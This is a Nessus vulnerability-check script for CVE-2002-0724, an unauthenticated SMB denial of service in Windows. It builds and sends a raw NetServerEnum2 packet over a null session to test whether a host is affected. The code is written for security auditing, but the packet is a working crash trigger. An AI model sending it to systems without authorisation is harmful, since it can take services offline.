#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Thanks to Iván Arce who provided me with all the relevant details of this
# exploit.
#
#
# Ref: http://www.corest.com/common/showdoc.php?idx=262&idxseccion=10
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# Only tested against W2K.
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11110);
 script_bugtraq_id(5556);
 script_version ("$Revision: 1.14 $");
 script_cve_id("CVE-2002-0724");

 name["english"] = "SMB null param count DoS";
 
 
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is vulnerable to a denial of service attack in its SMB
stack.

An attacker may exploit this flaw to crash the remote host remotely, without
any kind of authentication.

Solution : http://www.microsoft.com/technet/security/bulletin/ms02-045.mspx
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "crashes windows";
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 
 script_dependencies("netbios_name_get.nasl",
 		     "smb_login.nasl");
 script_require_keys("SMB/name", "SMB/login", "SMB/password");
 script_require_ports(139, 445);
 exit(0);
}

include("smb_nt.inc");
port = kb_smb_transport();
if(!port)port = 139;

function NetServerEnum2(soc, uid, tid)
{
 uid_lo = uid % 256;
 uid_hi = uid / 256;
 
 tid_lo = tid % 256;
 tid_hi = tid / 256;
 
 req = raw_string(0x00, 0x00,
        0x00, 0x5F, 0xFF, 0x53, 0x4D, 0x42, 0x25, 0x00,
 	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, tid_lo, tid_hi, 0x24, 0x04, uid_lo, uid_hi,
	0x00, 0x00, 0x0E, 0x13, 0x00, 0x00, 0x00, 0x01,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x4C,
	0x00, 0x00, 0x00, 0x5F, 0x00, 0x00, 0x00, 0x20,
	0x00, 0x5C, 0x50, 0x49, 0x50, 0x45, 0x5C, 0x4C,
	0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x00, 0x68, 0x00,
	0x57, 0x72, 0x4C, 0x65, 0x68, 0x00, 0x42, 0x31,
	0x33, 0x42, 0x57, 0x7A, 0x00, 0x01, 0x00, 0xE0,
	0xFF);
	
 len = strlen(req);
 	
 n = send(socket:soc, data:req);
 if(!(n == len))exit(0);
 
 r = smb_recv(socket:soc, length:4096);
 if (strlen (r) == 68)
 {
  # If the return code is STATUS_SUCCESS server can be vulnerable
  sub = substr (r, 9, 12);
  if ("00000000" >< hexstr (sub))
  {
   val = substr (r, strlen(r)-6, strlen(r)-1);
   if ("000000000000" >< hexstr (val))
   {
     val = substr (r, strlen(r)-9, strlen(r)-8);
     if ("0000" >!< hexstr(val))
       security_hole (port);
   }
  }
 }
}


name = kb_smb_name();
if(!name)exit(0);

login = kb_smb_login();
pass = kb_smb_password();


dom = kb_smb_domain();
if(!get_port_state(port))exit(0);

soc = open_sock_tcp(port);
if(soc)
 {
 r = smb_session_request(soc:soc,  remote:name);
 if(!r)exit(0);

  #
  # Negociate the protocol
  #
  prot = smb_neg_prot(soc:soc);
  if(!prot)exit(0);

  #
  # Set up our null session 
  #
  r = smb_session_setup(soc:soc, login:login, password:pass, domain:dom, prot:prot);
  if(!r)exit(0);
  # and extract our uid
  uid = session_extract_uid(reply:r);
  if(!uid)exit(0);
  r = smb_tconx(soc:soc, name:name, uid:uid, share:"IPC$");
  tid = tconx_extract_tid(reply:r);
  if(!tid)exit(0);
  NetServerEnum2(soc:soc, uid:uid, tid:tid);
 }
